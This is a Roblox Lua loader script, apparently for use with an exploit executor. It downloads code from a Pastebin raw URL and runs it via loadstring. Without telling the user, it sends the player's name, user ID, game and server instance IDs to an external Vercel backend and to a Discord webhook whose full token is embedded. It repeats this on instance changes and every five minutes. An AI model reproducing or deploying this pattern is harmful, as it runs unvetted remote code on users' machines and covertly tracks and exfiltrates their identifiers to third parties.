local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")

-- CONFIGURATION (Adjust to your needs)
local EXTERNAL_SCRIPT_URL = "https://pastebin.com/raw/pfpzbXiF"
local BACKEND_URL = "https://backend-vercel-ashy.vercel.app/api/register.js"
local INSTANCE_API_URL = "https://backend-vercel-ashy.vercel.app/api/instance" -- New endpoint for instance tracking
local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
local MAX_RETRIES = 3
local RETRY_DELAY = 2

-- System variables
local player = Players.LocalPlayer
local scriptCache = nil
local currentInstanceId = nil

-- ====================== [UTILITY FUNCTIONS] ======================

-- Get current instance ID
local function getCurrentInstanceId()
    local success, id = pcall(function()
        return game.JobId
    end)
    return success and id or "unknown-instance"
end

-- Send instance data to backend
local function sendInstanceData(data)
    pcall(function()
        HttpService:RequestAsync({
            Url = INSTANCE_API_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["X-Game-ID"] = tostring(game.GameId)
            },
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- Send data to backend
local function sendToBackend(data)
    pcall(function()
        HttpService:RequestAsync({
            Url = BACKEND_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["X-Game-ID"] = tostring(game.GameId)
            },
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- Send Discord webhook
local function sendToWebhook(message)
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode({
            content = message,
            embeds = {{
                title = "Delta Executor Report",
                color = 16711680,
                fields = {
                    {name = "Player", value = player.Name, inline = true},
                    {name = "UserID", value = player.UserId, inline = true},
                    {name = "PlaceID", value = game.PlaceId, inline = true},
                    {name = "InstanceID", value = currentInstanceId or "unknown", inline = true}
                },
                timestamp = DateTime.now():ToIsoDate()
            }}
        }))
    end)
end

-- Fetch script with caching
local function fetchScript()
    if scriptCache then return scriptCache end
    
    for attempt = 1, MAX_RETRIES do
        local success, content = pcall(function()
            return game:HttpGet(EXTERNAL_SCRIPT_URL, true)
        end)
        
        if success then
            scriptCache = content
            return content
        else
            warn("Attempt", attempt, "failed:", content)
            if attempt < MAX_RETRIES then task.wait(RETRY_DELAY) end
        end
    end
    error("Failed to fetch script")
end

-- Track instance changes
local function trackInstanceChanges()
    while task.wait(5) do
        local newInstanceId = getCurrentInstanceId()
        if newInstanceId ~= currentInstanceId then
            currentInstanceId = newInstanceId
            sendInstanceData({
                player = player.Name,
                userId = player.UserId,
                gameId = game.GameId,
                placeId = game.PlaceId,
                instanceId = currentInstanceId,
                timestamp = os.time()
            })
        end
    end
end

-- Main execution function
local function execute()
    -- Start instance tracking
    spawn(trackInstanceChanges)
    
    -- Get current instance before execution
    currentInstanceId = getCurrentInstanceId()
    
    -- Load and execute external script
    local fn, err = loadstring(fetchScript())
    if not fn then error(err) end
    
    -- Send initial instance data
    sendInstanceData({
        player = player.Name,
        userId = player.UserId,
        gameId = game.GameId,
        placeId = game.PlaceId,
        instanceId = currentInstanceId,
        status = "execution_started",
        timestamp = os.time()
    })
    
    local result = fn()
    
    -- Send completion data
    sendInstanceData({
        player = player.Name,
        userId = player.UserId,
        gameId = game.GameId,
        placeId = game.PlaceId,
        instanceId = currentInstanceId,
        status = "execution_completed",
        timestamp = os.time()
    })
    
    return result
end

-- ====================== [INITIALIZATION] ======================
local function init()
    -- Send startup webhook
    sendToWebhook("🚀 **Script started**\nPlayer: "..player.Name.." ("..player.UserId..")")
    
    -- Execute main script
    local success, err = pcall(execute)
    
    if success then
        sendToBackend({
            status = "success",
            player = player.Name,
            userId = player.UserId,
            gameId = game.GameId,
            instanceId = currentInstanceId,
            timestamp = os.time()
        })
    else
        sendToWebhook("❌ **Execution Failed**\n```lua\n"..tostring(err).."\n```")
        
        -- Send error instance data
        sendInstanceData({
            player = player.Name,
            userId = player.UserId,
            gameId = game.GameId,
            placeId = game.PlaceId,
            instanceId = currentInstanceId,
            status = "execution_failed",
            error = tostring(err),
            timestamp = os.time()
        })
    end
    
    -- Periodic reporting
    while task.wait(300) do
        sendToBackend({
            player = player.Name,
            userId = player.UserId,
            placeId = game.PlaceId,
            instanceId = currentInstanceId,
            status = "active",
            timestamp = os.time()
        })
    end
end

-- Start with error handling
local success, err = pcall(init)
if not success then
    sendToWebhook("💥 **CRITICAL ERROR**\n```lua\n"..tostring(err).."\n```")
end
